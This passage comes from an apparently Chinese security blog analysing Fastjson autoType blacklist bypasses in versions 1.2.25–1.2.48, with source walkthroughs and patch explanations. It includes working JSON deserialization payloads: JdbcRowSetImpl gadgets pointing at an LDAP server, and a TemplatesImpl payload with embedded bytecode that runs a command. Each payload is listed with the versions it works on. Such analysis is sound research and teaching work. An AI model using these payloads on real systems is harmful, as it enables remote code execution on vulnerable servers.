</span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果开启了autoType (<code>autoTypeSupport == true</code>), fastjson会先校验白名单, 需要加载的类若在白名单中, 直接加载, 若不在则校验黑名单. 如果即不在白名单中也不在黑名单中, 则进入以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531141621.png" alt="image.png"></p><p>先从一个mapping中获取, 如何为空, 则从<code>deserializers</code>中获取, 如果也为空, 则进入到后面对于没开启autoType的判断逻辑, 我们暂且不看后面, 这里的mapping和deserializers显然是两个map, 是否可用向其中put进恶意的类呢?<br>先来看TypeUtils.getClassFromMapping的逻辑, 确实是从一个map中get而来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String, Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142914.png" alt="image.png"></p><p>全局查找mappings.put, 有以下几个地方是可能可控的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142755.png" alt="image.png"><br>后面三个都存在于TypeUtils.loadClass方法中, 代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;  </span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);  </span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);  </span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;  </span><br><span class="line">            clazz = classLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        e.printStackTrace();  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;  </span><br><span class="line">            clazz = contextClassLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        clazz = Class.forName(className);  </span><br><span class="line">        mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现mappings实际上是对已经加载过的类的缓存. 也就是说, 被加载过的类都会存放在这里, 下次又需要加载的时候, 直接取出来用, 提高效率.<br>&#x3D;&#x3D;如何把我们的恶意类插入到mappings中呢?&#x3D;&#x3D; </p><p>我们返回到之前的调试过程思考: 当json的键为<code>@type</code>时, 它所对应的值(类名)会经过checkAutoType的审查, 但如果此时的恶意类作为一个其他类的Field(同样会被反序列化),或者说它的键名不是<code>@type</code>, 是否会经过checkAutoType呢?<br>全局搜索<code>TypeUtils.loadClass</code>, 看看除了checkAutoType还有哪里调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155451.png" alt="image.png"><br>如上图, 可控的只有四个, 而下面三个都是在checkAutoType中的, 无法利用, 我们聚焦于&#x3D;&#x3D;<code>MiscCodec</code>&#x3D;&#x3D;这个类中, 看一下这个类的定义<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155729.png" alt="image.png"></p><p>很明显这是一个反序列化器的实现类, 这个反序列化器实现了对一些杂项类的反序列化, 其中包括<code>Class.class</code>:</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531160027.png" alt="image.png"><br>对于一个<code>Class.class</code>, 该反序列化器直接调用<code>TypeUtils.loadClass</code>加载<code>strVal</code>, 那我们看一下<code>strVal</code>是什么<br>往上翻可以找到这个变量的来历<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531161326.png" alt="image.png"><br>实际上就是解析json中下一条键为”val”的值, 解析到的值String时, 直接赋值给strVal,<br>也就是说如果我们构造一个json字符串:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>虽然checkAutoType禁用了<code>com.sun.</code>, 但此时并不经过checkAutoType, <code>com.sun.rowset.JdbcRowSetImpl</code>会被<code>TypeUtils.loadClass</code>直接被加载一次, 然后把这个class缓存到mappings, 下次需要加载时就不经过checkAutoType直接从mappings中get了<br>于是就有了以下payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然, 也可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAgTEZhc3Rqc29uV2l0aFRlbXBsYXRlc0ltcGwkdGVzdDsBAApTb3VyY2VGaWxlAQAeRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbC5qYXZhDAAEAAUHABMBAB5GYXN0anNvbldpdGhUZW1wbGF0ZXNJbXBsJHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAZRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbAEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAE240YzE0NTY4MDc2MjAwNjUxMDABABVMbjRjMTQ1NjgwNzYyMDA2NTEwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAARAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>        <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;a.b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这个方法通杀<code>1.2.25-1.2.47</code>版本, 在AutoType默认不开启时可用</p><h3 id="AutoType开启时的绕过-利用字符前缀"><a href="#AutoType开启时的绕过-利用字符前缀" class="headerlink" title="AutoType开启时的绕过 利用字符前缀"></a>AutoType开启时的绕过 利用字符前缀</h3><p>当AutoType开启时(<code>AutoTypeSupport == true</code>), 还有另一种绕过手法, 我们回去看checkAutoType的逻辑, 当开启AutoTypeSupport或设置了期望类型时, 会走到这一步, 直接调用了loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211345.png" alt="image.png"></p><p>但在这之前是过了一次黑名单的, 为了绕过黑名单,  在loadClass中有以下操作:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211721.png" alt="image.png"></p><p>当类名以<code>L</code>开头<code>;</code>结尾时, 去掉这两个字符然后loadClass, 注意此时是递归调用的, 因此可用有很多层<code>L</code>开头<code>;</code>结尾去包裹恶意类, 都是可用正常解析的, 同理<code>[</code>开头也有此操作<br>因此当开启了AutoType时, 有以下payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>而对于<code>[</code>如果直接使用<code>[com.sun.rowset.JdbcRowSetImpl</code>会报错:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#x27;[&#x27;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:669)</span><br><span class="line">at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:177)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:137)</span><br><span class="line">at com.alibaba.fastjson.JSON.parse(JSON.java:128)</span><br><span class="line">at FastjsonWithJdbcRowSetImpl.withAutoTypeSupportAttackVersion_1_2_25(FastjsonWithJdbcRowSetImpl.java:41)</span><br><span class="line">at FastjsonWithJdbcRowSetImpl.main(FastjsonWithJdbcRowSetImpl.java:10)</span><br></pre></td></tr></table></figure><p>打断点看看哪里出错了<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213537.png" alt="image.png"><br>在扫描完类名后需要一个<code>[</code>, 而当前的token是16(可用点进去看, 16代表逗号<code>,</code>), 那我们在逗号前加<code>[</code>即可<br>之后又会报错<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213830.png" alt="image.png"><br>那再加一个<code>&#123;</code>来规避这个报错<br>最后payload就是这样</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然也可以尝试之前的TemplatesImpl</p><p>经过尝试: 对于使用<code>L ;</code>绕过, 1.2.43版本中被修复了, 但这个版本依然可以使用<code>&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</code>这个payload, 直到1.2.44被修复</p><p>梳理出payload适用版本:</p><p>fastjson &lt; 1.2.43</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>fastjson &lt; 1.2.44</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>1.2.25 &lt;&#x3D; fastjson &lt; 1.2.48</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我们来看一下这三个版本是怎么修复的</p><h3 id="fastjson-1-2-42的修复"><a href="#fastjson-1-2-42的修复" class="headerlink" title="fastjson 1.2.42的修复"></a>fastjson 1.2.42的修复</h3><p>其实在1.2.42版本中对于<code>L ;</code>绕过已经修复过一次了<br>版本改到1.2.42, 使用<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>这个类名去打<br>直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601000340.png" alt="image.png"><br>可以看见先对className的第一个字母和最后一个字母做了一次哈希, 如果值为<code>0x9198507b5af98f0L</code>则切割掉这两个字符, 很明显就是不允许类名前面为<code>L</code>后面为<code>;</code><br>这个版本切割得到的类名也不再是在明文的黑名单中去比较, 而是改成了哈希值列表<code>denyHashCodes</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0 = -8720046426850100497</span><br><span class="line">1 = -8109300701639721088</span><br><span class="line">2 = -7966123100503199569</span><br><span class="line">3 = -7766605818834748097</span><br><span class="line">4 = -6835437086156813536</span><br><span class="line">5 = -4837536971810737970</span><br><span class="line">6 = -4082057040235125754</span><br><span class="line">7 = -2364987994247679115</span><br><span class="line">8 = -1872417015366588117</span><br><span class="line">10 = -190281065685395680</span><br><span class="line">9 = -254670111376247151</span><br><span class="line">11 = 33238344207745342</span><br><span class="line">12 = 313864100207897507</span><br><span class="line">13 = 1203232727967308606</span><br><span class="line">14 = 1502845958873959152</span><br><span class="line">15 = 3547627781654598988</span><br><span class="line">16 = 3730752432285826863</span><br><span class="line">17 = 3794316665763266033</span><br><span class="line">18 = 4147696707147271408</span><br><span class="line">19 = 5347909877633654828</span><br><span class="line">20 = 5450448828334921485</span><br><span class="line">21 = 5751393439502795295</span><br><span class="line">22 = 5944107969236155580</span><br><span class="line">23 = 6742705432718011780</span><br><span class="line">24 = 7179336928365889465</span><br><span class="line">25 = 7442624256860549330</span><br><span class="line">26 = 8838294710098435315</span><br></pre></td></tr></table></figure><p>把我们的<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>净化为<code>com.sun.rowset.JdbcRowSetImpl</code>再hash后去在中查找, 很明显denyHashCodes中是有这个类对应的hash值的, 但是这样的过滤无济于事, 前面说过, loadClass在处理<code>L ;</code>时是递归的, 这里双写或者多加几层就绕过去了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>还有这个denyHashCodes列表, 在网上也有大牛进行了爆破, 参考</p><p><strong><a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a></strong></p><h3 id="fastjson-1-2-43的修复"><a href="#fastjson-1-2-43的修复" class="headerlink" title="fastjson 1.2.43的修复"></a>fastjson 1.2.43的修复</h3><p>这个版本对前面的双写又进行了修复<br>版本改到1.2.43, 直接去看TypeUtils.loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531234452.png" alt="image.png"></p><p>在checkAutoType又中添加了一层判断, 在出现<code>L</code>开头, <code>;</code>结尾的情况下, 出现<code>LL</code>开头就抛出错误, 这样就不能多层<code>L ;</code>绕过了. 但是别忘了, 我们还可以嵌套一层<code>[</code>来绕过</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-44的修复"><a href="#fastjson-1-2-44的修复" class="headerlink" title="fastjson 1.2.44的修复"></a>fastjson 1.2.44的修复</h3><p>同样地, 拿上个版本的payload去打, 看看怎么回事<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601003546.png" alt="image.png"><br>很明显这里不让<code>[</code>开头了, 第907行也不让<code>;</code>结尾了, 这条路算是堵死了, 当然了, 这个版本我们依然可以使用上面的缓存机制绕过</p><h3 id="fastjson-1-2-48的修复"><a href="#fastjson-1-2-48的修复" class="headerlink" title="fastjson 1.2.48的修复"></a>fastjson 1.2.48的修复</h3><p>在这个版本我们依旧尝试之前的缓存绕过来打, 看看报什么错, 由于可控的<code>mappings.put</code>是在TypeUtils.loadClass中的, 我们把断点打在loadClass中,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135215.png" alt="image.png"><br>如上图. 可以看见这里加了一个参数<code>cache</code>默认为<code>false</code>, 不进行缓存, 往回调看前一个调用栈<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250601135346.png" alt="image.png"><br>cache的值是写死在MiscCodec类中的, 导致不缓存加载过的危险类</p><h2 id="fastjson-1-2-68-期望类利用-AutoCloseable"><a 